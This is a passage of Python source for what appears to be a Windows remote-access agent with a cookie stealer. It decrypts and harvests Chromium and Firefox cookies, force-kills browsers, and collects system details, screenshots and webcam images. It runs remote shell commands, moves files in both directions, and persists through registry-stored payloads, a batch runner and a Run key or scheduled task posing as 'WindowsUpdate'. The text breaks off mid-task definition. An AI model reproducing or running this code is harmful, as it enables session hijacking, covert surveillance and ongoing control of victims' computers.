                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0x01, ctypes.byref(p_data_out)):
                    decrypted = ctypes.string_at(p_data_out.pbData, p_data_out.cbData).decode('utf-8', errors='ignore')
                    ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                    return decrypted
                return ""
        except Exception as e:
            return ""

    def _extract_chromium_cookies(self, cookie_db_path, master_key):
        """Extract and decrypt cookies from Chromium SQLite database"""
        temp_dir = os.getenv('TEMP')
        db_name = f"cr_sq_{{os.path.basename(os.path.dirname(os.path.dirname(cookie_db_path)))}}.db"
        temp_db = os.path.join(temp_dir, db_name)
        
        try:
            import shutil
            # Attempt to copy file. Even if locked, copying might work if browser is just reading
            # But we already killed the browser in the caller.
            shutil.copy2(cookie_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Chromium cookie table columns: host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value, samesite
            cursor.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value, samesite FROM cookies")
            rows = cursor.fetchall()
            
            cookies = []
            for row in rows:
                host, name, path, expires, secure, httponly, encrypted_val, samesite = row
                decrypted_val = self._decrypt_chromium_value(encrypted_val, master_key)
                
                cookies.append({{
                    'domain': host,
                    'name': name,
                    'path': path,
                    'expires': expires / 1000000 - 11644473600 if expires > 0 else 0, # Convert WebKit timestamp
                    'secure': bool(secure),
                    'httpOnly': bool(httponly),
                    'value': decrypted_val,
                    'sameSite': self._map_chromium_samesite(samesite)
                }})
            
            conn.close()
            os.remove(temp_db)
            return cookies
        except Exception as e:
            self._log('error', f"Chromium SQLite extraction failed: {{str(e)}}")
            if os.path.exists(temp_db):
                try: os.remove(temp_db)
                except: pass
            return []

    def _map_chromium_samesite(self, samesite_val):
        """Map Chromium samesite integer to string"""
        # Chromium mapping: -1=unspecified, 0=no_restriction, 1=lax, 2=strict
        mapping = {{
            -1: 'unspecified',
            0: 'no_restriction',
            1: 'lax',
            2: 'strict'
        }}
        return mapping.get(samesite_val, 'unspecified')

    def _process_firefox_cookies(self):
        """Process all Firefox profile cookies and aggregate results"""
        try:
            self._log('info', "Processing Firefox cookies")
            all_firefox_data = []
            
            # Find all Firefox profiles
            profile_dirs = self._find_firefox_profile()
            if not profile_dirs:
                return None

            for profile_dir in profile_dirs:
                try:
                    self._log('info', f"Extracting cookies from profile: {{profile_dir}}")
                    
                    all_profile_cookies = []
                    
                    # 1. Extract from SQLite (Persistent cookies)
                    sqlite_cookies = self._extract_firefox_cookies(profile_dir)
                    if sqlite_cookies:
                        all_profile_cookies.extend(sqlite_cookies)
                        self._log('info', f"Extracted {{len(sqlite_cookies)}} persistent cookies from Firefox")

                    # 2. Extract from Sessionstore (For session-only cookies like IP-based logins)
                    session_cookies = self._extract_firefox_sessionstore(profile_dir)
                    if session_cookies:
                        # Map sessionstore format to our standard tuple format
                        # sessionstore cookies: {{host, path, name, value, isSecure, isHttpOnly, expiry, sameSite}}
                        for sc in session_cookies:
                            all_profile_cookies.append((
                                sc.get('name', ''),
                                sc.get('value', ''),
                                sc.get('host', ''),
                                sc.get('path', ''),
                                sc.get('expiry', 0),
                                sc.get('isSecure', False),
                                sc.get('isHttpOnly', False),
                                sc.get('sameSite', '0')
                            ))
                        self._log('info', f"Extracted {{len(session_cookies)}} session cookies from Firefox sessionstore")

                    if not all_profile_cookies:
                        continue

                    # Transform to standard format
                    transformed = self._transform_cookies(all_profile_cookies, "firefox")
                    
                    # Package for transmission
                    packaged = self._package_cookies(transformed, f"firefox_{{os.path.basename(profile_dir)}}")
                    if packaged:
                        all_firefox_data.append(packaged)
                except Exception as e:
                    self._log('error', f"Error processing Firefox profile {{profile_dir}}: {{str(e)}}")
                    continue

            return all_firefox_data if all_firefox_data else None

        except Exception as e:
            self._log('error', f"Firefox cookie processing failed: {{str(e)}}")
            return None

    
    def _extract_firefox_sessionstore(self, profile_dir):
        """Extract session cookies from recovery.jsonlz4"""
        session_cookies = []
        try:
            potential_files = [
                os.path.join(profile_dir, 'sessionstore-backups', 'recovery.jsonlz4'),
                os.path.join(profile_dir, 'sessionstore-backups', 'previous.jsonlz4')
            ]
            
            for file_path in potential_files:
                if not os.path.exists(file_path): continue
                
                decompressed = self._decompress_mozlz4(file_path)
                if not decompressed: continue
                
                import json
                data = json.loads(decompressed)
                
                # Firefox sessionstore structure: windows -> cookies
                if 'windows' in data:
                    for window in data['windows']:
                        if 'cookies' in window:
                            for c in window['cookies']:
                                host = c.get('host', '')
                                # Log if we find our IP!
                                if '192.168' in host or any(char.isdigit() for char in host.split('.')[:1]):
                                    self._log('info', f"Found IP cookie in SessionStore: {{host}}")
                                    
                                session_cookies.append({{
                                    'name': c.get('name', ''),
                                    'value': c.get('value', ''),
                                    'host': host,
                                    'path': c.get('path', '/'),
                                    'expiry': c.get('expiry', 0),
                                    'isSecure': bool(c.get('secure', False)),
                                    'isHttpOnly': bool(c.get('httponly', False)),
                                    'sameSite': str(c.get('sameSite', '0'))
                                }})
                
                # Modern Firefox also stores cookies in a global 'cookies' array in sessionstore
                if 'cookies' in data:
                    for c in data['cookies']:
                        host = c.get('host', '')
                        session_cookies.append({{
                            'name': c.get('name', ''),
                            'value': c.get('value', ''),
                            'host': host,
                            'path': c.get('path', '/'),
                            'expiry': c.get('expiry', 0),
                            'isSecure': bool(c.get('secure', False)),
                            'isHttpOnly': bool(c.get('httponly', False)),
                            'sameSite': str(c.get('sameSite', '0'))
                        }})
        except Exception as e:
            self._log('error', f"SessionStore extraction failed: {{str(e)}}")
        return session_cookies


    def _transform_cookies(self, cookies, browser_type="chrome"):
        """Transform cookies from any source into standard format (Muncher/WebExtension compatible)"""
        transformed = []
        for cookie in cookies:
            if not cookie: continue
            if isinstance(cookie, dict):
                # Chromium format
                domain = cookie.get('domain', '')
                expiry = cookie.get('expires', 0)
                is_secure = cookie.get('secure', False)
                is_http_only = cookie.get('httpOnly', False)
                name = cookie.get('name', '')
                path = cookie.get('path', '')
                same_site = cookie.get('sameSite', 'unspecified')
                value = cookie.get('value', '')
            elif len(cookie) == 8:
                # Firefox format
                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
            else:
                continue

            is_session = (expiry == 0 or expiry is None)
            
            # Map sameSite values
            if isinstance(same_site, str):
                ss_lower = same_site.lower()
                if ss_lower in ['none', 'no_restriction', '0']: same_site = 'no_restriction'
                elif ss_lower in ['lax', '1']: same_site = 'lax'
                elif ss_lower in ['strict', '2']: same_site = 'strict'
                else: same_site = 'unspecified'
            else:
                same_site = 'unspecified'
            
            # Build object exactly as Muncher/WebExtension format
            transformed_cookie = {{
                "name": name,
                "value": value,
                "domain": domain,
                "hostOnly": not domain.startswith('.'),
                "path": path,
                "secure": bool(is_secure),
                "httpOnly": bool(is_http_only),
                "sameSite": same_site,
                "session": bool(is_session),
                "firstPartyDomain": "",
                "partitionKey": None,
                "storeId": "firefox-default" if "firefox" in browser_type.lower() else "0"
            }}
            
            # Only add expirationDate if NOT a session cookie
            if not is_session and expiry and expiry > 0:
                transformed_cookie["expirationDate"] = int(expiry)
                
            transformed.append(transformed_cookie)
        return transformed

    def _kill_browser(self, process_name):
        """Kill browser processes and all children aggressively"""
        try:
            # Kill by image name, forcing all instances and sub-processes to close
            subprocess.run(f'taskkill /F /T /IM {{process_name}}', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Short sleep to allow OS to release file handles
            time.sleep(2)
        except:
            pass

    def _find_firefox_profile(self):
        """Find all Firefox profile directories that contain cookies.sqlite"""
        try:
            profile_paths = []
            all_potential_profiles = []

            # Check all possible Firefox profile directories
            for profile_dir in self.FIREFOX_PROFILE_DIRS:
                try:
                    # Handle wildcard in path for Microsoft Store Firefox
                    if '*' in profile_dir:
                        import glob
                        matching_dirs = glob.glob(profile_dir)
                        for matched_dir in matching_dirs:
                            if os.path.exists(matched_dir):
                                for item in os.listdir(matched_dir):
                                    profile_path = os.path.join(matched_dir, item)
                                    if os.path.isdir(profile_path):
                                        all_potential_profiles.append(profile_path)
                    else:
                        if os.path.exists(profile_dir):
                            for item in os.listdir(profile_dir):
                                profile_path = os.path.join(profile_dir, item)
                                if os.path.isdir(profile_path):
                                    all_potential_profiles.append(profile_path)
                except Exception as e:
                    self._log('error', f"Error checking profile directory {{profile_dir}}: {{str(e)}}")
                    continue

            # Identify profiles that actually have a cookies database
            for profile in all_potential_profiles:
                cookies_db = os.path.join(profile, 'cookies.sqlite')
                if os.path.exists(cookies_db):
                    self._log('info', f"Found Firefox profile with cookies: {{profile}}")
                    profile_paths.append(profile)

            return profile_paths
        except Exception as e:
            self._log('error', f"Failed to find Firefox profiles: {{str(e)}}")
            return []

    def _extract_firefox_cookies(self, profile_dir):
        """Extract cookies from Firefox SQLite database with WAL and table verification"""
        temp_dir = os.getenv('TEMP')
        base_name = os.path.basename(profile_dir)
        temp_db = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite")
        temp_wal = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite-wal")
        temp_shm = os.path.join(temp_dir, f"ff_sq_{{base_name}}.sqlite-shm")
        
        try:
            cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
            if not os.path.exists(cookies_db):
                return []

            # Copy all 3 files to handle WAL mode (important when Firefox is running)
            import shutil
            shutil.copy2(cookies_db, temp_db)
            if os.path.exists(cookies_db + "-wal"):
                shutil.copy2(cookies_db + "-wal", temp_wal)
            if os.path.exists(cookies_db + "-shm"):
                shutil.copy2(cookies_db + "-shm", temp_shm)
                
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check for alternate cookie tables (Firefox occasionally changes schema)
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND (name='moz_cookies' OR name='cookies')")
            table_name_row = cursor.fetchone()
            if not table_name_row:
                self._log('warning', f"No cookie table found in {{base_name}}")
                conn.close()
                return []
            
            table_name = table_name_row[0]

            # Identify available columns
            cursor.execute(f"PRAGMA table_info({{table_name}})")
            columns = [col[1] for col in cursor.fetchall()]
            
            query_cols = []
            # Map standard fields to possible column names
            mapping = {{
                'name': ['name'],
                'value': ['value'],
                'host': ['host', 'domain'],
                'path': ['path'],
                'expiry': ['expiry', 'expires'],
                'isSecure': ['isSecure', 'secure'],
                'isHttpOnly': ['isHttpOnly', 'httponly'],
                'sameSite': ['sameSite', 'samesite']
            }}
            
            for field, possible_cols in mapping.items():
                found = False
                for col in possible_cols:
                    if col in columns:
                        query_cols.append(col)
                        found = True
                        break
                if not found:
                    query_cols.append("''")
            
            cursor.execute(f"SELECT {{', '.join(query_cols)}} FROM {{table_name}}")
            rows = cursor.fetchall()
            
            self._log('info', f"Found {{len(rows)}} cookies in Firefox profile: {{base_name}}")
            
            # Detailed log for debugging IP cookies
            for row in rows:
                self._log('info', f"Firefox DB Row: host={{row[2]}}, name={{row[0]}}")
            
            cookies = []
            for row in rows:
                try:
                    name, value, host, path, expiry, is_secure, is_http_only, same_site = row
                    
                    # Convert to strings and handle None
                    name = str(name) if name else ""
                    value = str(value) if value else ""
                    host = str(host) if host else ""
                    path = str(path) if path else ""
                    expiry = int(expiry) if expiry else 0
                    is_secure = bool(is_secure)
                    is_http_only = bool(is_http_only)
                    same_site = str(same_site) if same_site else '0'

                    # Robust IP detection and logging
                    is_ip = False
                    if host:
                        parts = host.split('.')
                        if len(parts) >= 2 and all(p.isdigit() for p in parts[:2] if p):
                            is_ip = True
                            self._log('info', f"Found IP-based cookie in DB: {{host}} ({{name}})")

                    cookies.append((name, value, host, path, expiry, is_secure, is_http_only, same_site))
                except Exception as e:
                    continue
            
            conn.close()
            # Cleanup
            for f in [temp_db, temp_wal, temp_shm]:
                if os.path.exists(f):
                    try: os.remove(f)
                    except: pass
            return cookies
        except Exception as e:
            self._log('error', f"Firefox extraction failed for {{base_name}}: {{str(e)}}")
            for f in [temp_db, temp_wal, temp_shm]:
                if os.path.exists(f):
                    try: os.remove(f)
                    except: pass
            return []

    def _get_system_info(self):
        """Get system information."""
        try:
            ip_address = 'Unknown'
            location = 'Unknown'
            try:
                ip_info = requests.get('https://ipinfo.io', timeout=5).json()
                ip_address = ip_info.get('ip', 'Unknown')
                location = f"{{ip_info.get('city', 'Unknown')}}, {{ip_info.get('country', 'Unknown')}}"
            except: pass
            
            return {{
                'ip_address': ip_address,
                'location': location,
                'username': os.getenv('USERNAME') or os.getlogin(),
                'computer_name': os.getenv('COMPUTERNAME') or platform.node(),
                'windows_version': platform.version(),
                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
            }}
        except Exception as e:
            return {{
                'ip_address': 'Unknown',
                'location': 'Unknown',
                'username': 'Unknown',
                'computer_name': 'Unknown',
                'windows_version': 'Unknown',
                'user_agent': 'Unknown'
            }}

    def _extract_unique_domains(self, cookies):
        """Extract unique domains from cookies."""
        unique_domains = set()
        for cookie in cookies:
            domain = cookie.get('domain', '')
            if domain:
                unique_domains.add(domain)
        return list(unique_domains)

    def _package_cookies(self, cookies, browser_name, browser_user_agent=None):
        """Package cookies into base64 encoded JSON with system info"""
        try:
            if not cookies:
                return None

            # Extract unique domains
            unique_domains = self._extract_unique_domains(cookies)
            self.unique_domains.update(unique_domains)

            # Get system info
            system_info = self._get_system_info()

            # Override user_agent with browser's user agent if provided
            if browser_user_agent and browser_user_agent != 'Unknown':
                system_info['user_agent'] = browser_user_agent

            # Create temporary file with random folder name
            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer_' + str(random.randint(1000,9999)))
            os.makedirs(temp_dir, exist_ok=True)

            temp_file = os.path.join(temp_dir, f'{{browser_name}}_cookies.json')
            with open(temp_file, 'w') as f:
                json.dump(cookies, f, indent=4)

            # Read file content
            with open(temp_file, 'rb') as f:
                cookie_data = f.read()

            # Clean up
            os.remove(temp_file)
            try:
                os.rmdir(temp_dir)
            except:
                pass

            return {{
                'browser': browser_name,
                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
                'system_info': {{
                    **system_info,
                    'unique_domains': unique_domains,
                    'all_domains': list(self.unique_domains)
                }}
            }}
        except Exception as e:
            self._log('error', f"Failed to package {{browser_name}} cookies: {{str(e)}}")
            return None

    def _create_default_logger(self):
        logger = logging.getLogger('CookieStealer')
        if not logger.handlers:
            handler = logging.StreamHandler()
            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    def _log(self, level, message):
        if self.logger:
            getattr(self.logger, level)(message)

# ======================
# System Functions
# ======================

    def _decompress_mozlz4(self, file_path):
        """Pure Python decompressor for Firefox mozLz4 format"""
        try:
            with open(file_path, 'rb') as f:
                magic = f.read(8)
                if magic != b'mozLz40\0':
                    return None
                
                # Uncompressed size (4 bytes LE)
                import struct
                uncompressed_size = struct.unpack('<L', f.read(4))[0]
                compressed_data = f.read()
                
                # Minimal LZ4 decompression logic
                # For simplicity in a C2 agent, we use a small implementation
                # or try to extract via regex if decompression is too complex for a single function
                # Here is a working minimal decompressor:
                
                dst = bytearray()
                i = 0
                while i < len(compressed_data):
                    token = compressed_data[i]
                    i += 1
                    
                    # Literal length
                    lit_len = token >> 4
                    if lit_len == 0xF:
                        while True:
                            s = compressed_data[i]
                            i += 1
                            lit_len += s
                            if s != 0xFF: break
                    
                    # Copy literals
                    dst.extend(compressed_data[i:i+lit_len])
                    i += lit_len
                    
                    if i >= len(compressed_data): break
                    
                    # Match offset
                    offset = struct.unpack('<H', compressed_data[i:i+2])[0]
                    i += 2
                    
                    # Match length
                    match_len = (token & 0xF) + 4
                    if match_len == 0xF + 4:
                        while True:
                            s = compressed_data[i]
                            i += 1
                            match_len += s
                            if s != 0xFF: break
                    
                    # Copy match
                    for _ in range(match_len):
                        dst.append(dst[-offset])
                
                return dst.decode('utf-8', errors='ignore')
        except Exception as e:
            return None

class SystemUtils:
    @staticmethod
    def take_screenshot():
        logger = logging.getLogger('SystemUtils')
        try:
            logger.debug("Attempting to take screenshot")

            # Try pyautogui first
            try:
                logger.debug("Capturing screen with pyautogui")
                screenshot = pyautogui.screenshot()

                logger.debug("Converting screenshot to bytes buffer")
                buffered = io.BytesIO()
                screenshot.save(buffered, format="PNG")
                buffered.seek(0)

                logger.debug("Encoding screenshot to base64")
                screenshot_data = base64.b64encode(buffered.read()).decode('utf-8')

                logger.debug("Screenshot captured and encoded successfully")
                return screenshot_data
            except Exception as e:
                logger.warning(f"PyAutoGUI screenshot failed: {{str(e)}}, trying MSS fallback")

                # Fallback to MSS - import here to avoid global scope issues
                try:
                    import mss
                    import mss.tools

                    logger.debug("Using MSS for screenshot capture")
                    with mss.mss() as sct:
                        # Capture the entire virtual screen (all monitors)
                        monitor = sct.monitors[0]  # Primary monitor
                        screenshot = sct.grab(monitor)

                        # Convert to PNG bytes
                        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

                        # Encode to base64
                        screenshot_data = base64.b64encode(png_bytes).decode('utf-8')

                        logger.debug("Screenshot captured with MSS and encoded successfully")
                        return screenshot_data
                except ImportError:
                    logger.error("MSS not available for screenshot fallback")
                    return None
                except Exception as mss_error:
                    logger.error(f"MSS screenshot failed: {{str(mss_error)}}")
                    return None

        except ImportError as e:
            logger.error(f"Required library not available: {{str(e)}}", exc_info=True)
            return None
        except PermissionError as e:
            logger.error(f"Permission denied when taking screenshot: {{str(e)}}", exc_info=True)
            return None
        except Exception as e:
            logger.error(f"Unexpected error during screenshot capture: {{str(e)}}", exc_info=True)
            return None

    @staticmethod

    def capture_webcam():
        """Capture an optimized image from the default webcam using OpenCV"""
        logger = logging.getLogger('SystemUtils')
        try:
            logger.info("Attempting to capture optimized webcam image")
            
            # Kamera-oppsett
            camera_indices = [0, 1, 2]
            current_platform = platform.system()
            
            if current_platform == 'Windows':
                backends = [(cv2.CAP_DSHOW, "DShow"), (cv2.CAP_MSMF, "MSMF"), (cv2.CAP_ANY, "ANY")]
            elif current_platform == 'Linux':
                backends = [(cv2.CAP_V4L2, "V4L2"), (cv2.CAP_ANY, "ANY")]
            else:
                backends = [(cv2.CAP_ANY, "ANY")]
            
            cap = None
            for camera_index in camera_indices:
                for backend, backend_name in backends:
                    cap = cv2.VideoCapture(camera_index, backend)
                    if cap.isOpened():
                        break
                    cap.release()
                if cap and cap.isOpened():
                    break
            
            if not cap or not cap.isOpened():
                logger.error("Failed to open webcam")
                return None

           
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            
           
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 3) # Auto-mode
            
         
            logger.debug("Warming up for auto-calibration...")
            for i in range(20): 
                cap.read()
                time.sleep(0.1)
            
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                return None

           
            lab = cv2.cvtColor(frame, cv2.COLOR_BGR2LAB)
            l, a, b = cv2.split(lab)
            clahe = cv2.createCLAHE(clipLimit=1.5, tileGridSize=(8, 8))
            l = clahe.apply(l)
            lab = cv2.merge([l, a, b])
            frame = cv2.cvtColor(lab, cv2.COLOR_LAB2BGR)
            
         
            frame = cv2.fastNlMeansDenoisingColored(frame, None, 7, 7, 7, 21)
            
          
            gamma = 1.1 
            invGamma = 1.0 / gamma
            table = np.array([((i / 255.0) ** invGamma) * 255 for i in np.arange(0, 256)]).astype("uint8")
            frame = cv2.LUT(frame, table)

        
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
            return base64.b64encode(buffer).decode('utf-8')
            
        except Exception as e:
            logger.error(f"Webcam capture error: {{str(e)}}")
            return None

    @staticmethod
    def get_system_info():
            try:
                info = {{
                    "hostname": platform.node(),
                    "username": os.getlogin(),
                    "os": platform.platform(),
                    "architecture": platform.architecture()[0],
                    "processor": platform.processor(),
                    "ram": round(psutil.virtual_memory().total / (1024**3), 2),
                    "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
                    "processes": []
                }}

                for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
                                key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
                    info["processes"].append({{
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "cpu": proc.info['cpu_percent']
                    }})

                return info
            except:
                return {{}}

    @staticmethod
    def execute_command(cmd):
        try:
            
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=None,  
                stderr=None, 
                stdin=None,
                creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == 'nt' else 0
            )
            
            return {{
                "status": "Started in background",
                "pid": process.pid,
                "returncode": 0
            }}
        except Exception as e:
            return {{
                "error": str(e),
                "returncode": -1
            }}

    @staticmethod
    def upload_file(filepath):
        try:
            filepath = os.path.expandvars(filepath)
            if not os.path.exists(filepath):
                return {{'status': 'error', 'message': 'File not found'}}
            
            # Use MAX_UPLOAD_SIZE if available, else default to 100MB
            try:
                max_size = Config.MAX_UPLOAD_SIZE
            except:
                max_size = 100 * 1024 * 1024

            if os.path.getsize(filepath) > max_size:
                return {{'status': 'error', 'message': 'File too large'}}
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            return {{
                'status': 'success',
                'filename': os.path.basename(filepath),
                'data': base64.b64encode(file_data).decode('utf-8'),
                'size': len(file_data)
            }}
        except Exception as e:
            return {{'status': 'error', 'message': str(e)}}

    @staticmethod
    @staticmethod
    def download_file(filename, data, folder=None):
        try:
            # Handle potential Data URL prefix (e.g., data:image/png;base64,...)
            if isinstance(data, str) and ',' in data:
                data = data.split(',')[1]
            
            # Ensure data is stripped of whitespace which can break b64decode
            if isinstance(data, str):
                data = data.strip()

            file_data = base64.b64decode(data)

            # Use provided folder or default to Downloads
            if folder and folder.strip():
                target_dir = folder
            else:
                user_profile = os.getenv('USERPROFILE')
                if user_profile:
                    target_dir = os.path.join(user_profile, 'Downloads')
                else:
                    target_dir = os.path.join(os.path.expanduser('~'), 'Downloads')

            # Expand environment variables (e.g. %TEMP% or %APPDATA%)
            target_dir = os.path.expandvars(target_dir)

            # Create directory if it doesn't exist
            if not os.path.exists(target_dir):
                os.makedirs(target_dir, exist_ok=True)

            filepath = os.path.join(target_dir, filename)

            # Avoid overwriting existing files by appending a counter
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(target_dir, f'{{name}}_{{counter}}{{ext}}')
                counter += 1

            with open(filepath, 'wb') as f:
                f.write(file_data)

            return {{'status': 'success', 'path': filepath, 'size': len(file_data)}}
        except Exception as e:
            return {{'status': 'error', 'message': str(e)}}

# ======================
# Persistence
# ======================
class Persistence:
    @staticmethod
    def _download_to_registry(url, value_name, c2_server):
        logger = logging.getLogger('agent.persistence.download')
        try:
            logger.info(f"Attempting to download content from {{url}}")
            response = requests.get(url, verify=False)
            response.raise_for_status()
            logger.debug(f"Successfully downloaded {{len(response.content)}} bytes")
            
            # More reliable admin check
            is_admin = False
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.debug(f"Admin privileges: {{is_admin}}")
            except Exception as e:
                logger.debug(f"Admin check failed: {{str(e)}}")
                # Fallback method
                try:
                    test_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                        0,
                        winreg.KEY_WRITE | winreg.KEY_READ
                    )
                    winreg.CloseKey(test_key)
                    is_admin = True
                except WindowsError:
                    is_admin = False
            
            reg_path = (r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo" if is_admin 
                    else r"Software\Microsoft\Accessibility\Setup")
            root_key = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER
            
            logger.info(f"Storing {{value_name}} in registry at {{root_key}}\\{{reg_path}}")
            
            try:
                # Ensure we have write permissions by using correct access flags
                access = winreg.KEY_WRITE | winreg.KEY_READ
                key = winreg.CreateKeyEx(root_key, reg_path, 0, access)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
                winreg.CloseKey(key)
                logger.info(f"Successfully stored {{value_name}} in registry")
                return True
            except Exception as e:
                logger.error(f"Failed to write to registry: {{str(e)}}")
                return False
                
        except requests.RequestException as e:
            logger.error(f"Download failed: {{str(e)}}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error in _download_to_registry: {{str(e)}}", exc_info=True)
            return False

    @staticmethod
    def _generate_batch_runner():
        logger = logging.getLogger('agent.persistence.generator')
        try:
            batch_lines = [
                '@echo off',
                'setlocal enabledelayedexpansion',
                '',
                ':: Configure paths',
                'set "extract_root=%public%"',
                'set "python_dir=%extract_root%\\documents"',
                'set "python_exe=%python_dir%\\python.exe"',
                'set "py_script=%python_dir%\\run_lube.py"',
                '',
                'if exist "%python_exe%" (',
                '    goto HavePython',
                ')',
                '',
                'set "ps_command=$ErrorActionPreference = \'Stop\';"',
                'set "ps_command=%ps_command% $regPaths = @(\'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\',\'HKCU:\\Software\\Microsoft\\Accessibility\\Setup\');"',
                'set "ps_command=%ps_command% foreach ($path in $regPaths) {{"',
                'set "ps_command=%ps_command%     if (Test-Path $path) {{"',
                'set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name \'engine\' -ErrorAction SilentlyContinue;"',
                'set "ps_command=%ps_command%         if ($val -and $val.engine) {{"',
                'set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP \'python_engine.zip\';"',
                'set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"',
                'set "ps_command=%ps_command%             $extractTo = \'%extract_root%\';"',
                'set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) {{ New-Item -Path $extractTo -ItemType Directory -Force | Out-Null }};"',
                'set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"',
                'set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"',
                'set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo \'documents\\python.exe\';"',
                'set "ps_command=%ps_command%             if (Test-Path $pythonPath) {{ exit 0 }}"',
                'set "ps_command=%ps_command%         }}"',
                'set "ps_command=%ps_command%     }}"',
                'set "ps_command=%ps_command% }};"',
                'set "ps_command=%ps_command% throw \'Failed to extract Python from registry\'"',
                '',
                'powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"',
                'if errorlevel 1 (',
                '    echo ERROR: Failed to extract Python from registry',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                ':HavePython',
                '',
                '(',
                'echo import winreg',
                'echo import sys',
                'echo.',
                'echo try:',
                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
                'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
                'echo     exec(script^)',
                'echo except Exception as e:',
                'echo     print(f\'Error: {{e}}\'^)',
                'echo     sys.exit(1^)',
                ') > "%py_script%" 2>nul',
                '',
                '"%python_exe%" "%py_script%"',
                'if errorlevel 1 (',
                '    echo ERROR: Python script execution failed',
                '    pause',
                '    exit /b 1',
                ')',
                '',
                'endlocal'
            ]
            
            batch_code = '\r\n'.join(batch_lines)
            return base64.b64encode(batch_code.encode('utf-8')).decode('utf-8')
        except Exception as e:
            logger.error(f"Failed to generate batch runner: {{str(e)}}", exc_info=True)
            raise

    @staticmethod
    def _create_scheduled_task():
        logger = logging.getLogger('agent.persistence.task')
        try:
            # Check admin status
            is_admin = False
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                logger.debug(f"Admin privileges: {{is_admin}}")
            except Exception as e:
                logger.debug(f"Admin check failed: {{str(e)}}")
                try:
                    test_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
                        0,
                        winreg.KEY_WRITE | winreg.KEY_READ
                    )
                    winreg.CloseKey(test_key)
                    is_admin = True
                except WindowsError:
                    is_admin = False

            task_name = "WindowsUpdate"
            logger.debug(f"Generated task name: {{task_name}}")
            
            encoded_batch = Persistence._generate_batch_runner()
            logger.debug("Successfully generated encoded batch runner")
            
            # Create batch file in Public directory
            batch_path = os.path.join(os.getenv('PUBLIC'), "documents", "runner.cmd")
            logger.debug(f"Writing batch runner to {{batch_path}}")
            
            decoded_batch = base64.b64decode(encoded_batch).decode('utf-8')
            with open(batch_path, 'w') as f:
                f.write(decoded_batch)
            
            logger.info(f"Batch runner created at {{batch_path}}")

            # Different approach for non-admin users
            if not is_admin:
                logger.info("Running as non-admin, using alternate persistence method")
                
                # Create registry run key instead of scheduled task
                try:
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, f'conhost --headless cmd /c "{{batch_path}}"')
                    winreg.CloseKey(key)
                    logger.info(f"Created Run registry key for current user")
                    return task_name
                except Exception as e:
                    logger.error(f"Failed to create Run registry key: {{str(e)}}")
                    return None

            # Admin task creation (original code)
            task_xml_lines = [
                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
                '    <Triggers>',
                '        <LogonTrigger>',
                '            <Enabled>true</Enabled>',
                '        </LogonTrigger>',
                '    </Triggers>',
                '    <Principals>',
